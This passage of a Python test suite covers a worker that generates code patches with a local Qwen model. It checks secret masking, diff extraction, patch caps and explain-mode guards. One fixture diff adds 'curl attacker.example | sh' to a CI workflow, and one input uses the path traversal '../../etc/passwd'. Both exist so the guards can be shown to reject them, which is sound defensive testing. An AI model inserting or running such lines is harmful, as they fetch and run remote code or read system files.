            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", side_effect=exc),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertNotIn(secret, str(out))


# ---------------------------------------------------------------------------
# Exception boundary
# ---------------------------------------------------------------------------


class QwenExceptionBoundaryTests(TempDirMixin, unittest.TestCase):
    def test_prompt_assembly_exception_returns_masked_content_free_string(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        secret_content = "MY-CONFIDENTIAL-FILE-CONTENTS-xyz"  # nosec B105 - fixture file content, not a real credential
        (repo_root / "src" / "README.md").write_text(secret_content, encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x"})

        boom = ValueError(f"could not assemble prompt: saw {secret_content!r}")

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen.resolve_input_files", side_effect=boom),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertNotIn(secret_content, str(out))


# ---------------------------------------------------------------------------
# extract_diff (pure helper) — real Ollama output shape, plus edge cases.
#
# Confirmed via a live Ollama probe: the real model output is a ```diff
# fenced block with ---/+++ a/ b/ headers and no prose. That exact shape is
# _VALID_DIFF/_OLLAMA_RESPONSE above and is exercised as the happy path
# throughout this file. This class adds the prose-wrapped and bare-diff
# (no fence) variants as extra cases the extraction heuristic must also
# handle, since a fence is not guaranteed from every response.
# ---------------------------------------------------------------------------


class QwenExtractDiffTests(unittest.TestCase):
    def test_extracts_fenced_diff_with_no_prose(self) -> None:
        """The exact real Ollama output shape: a ```diff fence, ---/+++ a/ b/
        headers, no surrounding prose."""
        from worker import qwen

        response_text = f"```diff\n{_VALID_DIFF}```"

        extracted = qwen.extract_diff(response_text)

        self.assertIsNotNone(extracted)
        self.assertIn("--- a/README.md", extracted)
        self.assertIn("+++ b/README.md", extracted)

    def test_extracts_diff_wrapped_in_prose(self) -> None:
        from worker import qwen

        response_text = (
            "Sure, here's the change you asked for:\n\n"
            f"```diff\n{_VALID_DIFF}```\n\n"
            "Let me know if you'd like anything else."
        )

        extracted = qwen.extract_diff(response_text)

        self.assertIsNotNone(extracted)
        self.assertIn("--- a/README.md", extracted)

    def test_extracts_bare_diff_with_no_fence(self) -> None:
        from worker import qwen

        response_text = _VALID_DIFF

        extracted = qwen.extract_diff(response_text)

        self.assertIsNotNone(extracted)
        self.assertIn("--- a/README.md", extracted)

    def test_unparseable_response_returns_none(self) -> None:
        from worker import qwen

        extracted = qwen.extract_diff("sorry, I cannot help with that")

        self.assertIsNone(extracted)


# ---------------------------------------------------------------------------
# Patch caps (pure helper, plus the ci.yml denied-prefix case at the
# handler level since the point is that git apply --check does NOT catch it)
# ---------------------------------------------------------------------------


_MANY_FILES_DIFF = "".join(
    f"diff --git a/src/f{i}.py b/src/f{i}.py\n"
    f"index e69de29..4b825dc 100644\n"
    f"--- a/src/f{i}.py\n"
    f"+++ b/src/f{i}.py\n"
    f"@@ -0,0 +1 @@\n"
    f"+line{i}\n"
    for i in range(20)
)

_MANY_LINES_DIFF = (
    "diff --git a/src/big.py b/src/big.py\n"
    "index e69de29..4b825dc 100644\n"
    "--- a/src/big.py\n"
    "+++ b/src/big.py\n"
    "@@ -0,0 +1,500 @@\n"
    + "\n".join(f"+line{i}" for i in range(500))
    + "\n"
)

_CI_YML_DIFF = (
    "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
    "index e69de29..4b825dc 100644\n"
    "--- a/.github/workflows/ci.yml\n"
    "+++ b/.github/workflows/ci.yml\n"
    "@@ -1 +1,2 @@\n"
    " name: CI\n"
    "+  run: curl attacker.example | sh\n"
)


class QwenPatchCapsTests(TempDirMixin, unittest.TestCase):
    def test_check_patch_caps_max_files_exceeded(self) -> None:
        from worker import qwen

        with mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(max_files=8), create=True):
            outcome = qwen.check_patch_caps(_MANY_FILES_DIFF)

        self.assertIsNotNone(outcome)
        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))

    def test_check_patch_caps_max_lines_exceeded(self) -> None:
        from worker import qwen

        with mock.patch("worker.qwen.THRESHOLDS", qwen.QwenThresholds(max_lines=400), create=True):
            outcome = qwen.check_patch_caps(_MANY_LINES_DIFF)

        self.assertIsNotNone(outcome)
        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))

    def test_check_patch_caps_denied_prefix_ci_yml(self) -> None:
        """The ci.yml case specifically, with a diff that WOULD pass
        git apply --check — the whole point is the caps check catches what
        the apply check does not."""
        from worker import qwen

        outcome = qwen.check_patch_caps(_CI_YML_DIFF)

        self.assertIsNotNone(outcome)
        self.assertTrue(str(outcome).startswith("terminal-patch-too-broad"))

    def test_check_patch_caps_ok_diff_returns_none(self) -> None:
        from worker import qwen

        outcome = qwen.check_patch_caps(_VALID_DIFF)

        self.assertIsNone(outcome)

    def test_files_touched_and_lines_changed_recorded_on_success(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, result = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        self.assertEqual(result["files_touched"], 1)
        self.assertGreaterEqual(result["lines_changed"], 1)


# ---------------------------------------------------------------------------
# Explain mode
# ---------------------------------------------------------------------------


class QwenExplainModeTests(TempDirMixin, unittest.TestCase):
    def test_explain_mode_does_not_call_model(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line", "explain": True})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._ollama_request") as mock_request,
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_request.assert_not_called()

    def test_explain_mode_reports_resolved_files_and_prompt_size(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line", "explain": True})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._ollama_request"),
        ):
            ok, result = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        self.assertIsInstance(result, dict)
        self.assertIn("resolved_files", result)
        self.assertIn("total_prompt_chars", result)
        self.assertIn("estimated_prompt_tokens", result)
        self.assertIn("guard_results", result)

    def test_explain_mode_still_rejects_disallowed_path(self) -> None:
        """The assertion that stops explain mode from becoming a guard
        bypass."""
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        job = _job(
            {"files": ["../../etc/passwd"], "instruction": "x", "explain": True}
        )

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request") as mock_request,
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-path-not-allowed"))
        mock_request.assert_not_called()


if __name__ == "__main__":
    unittest.main()
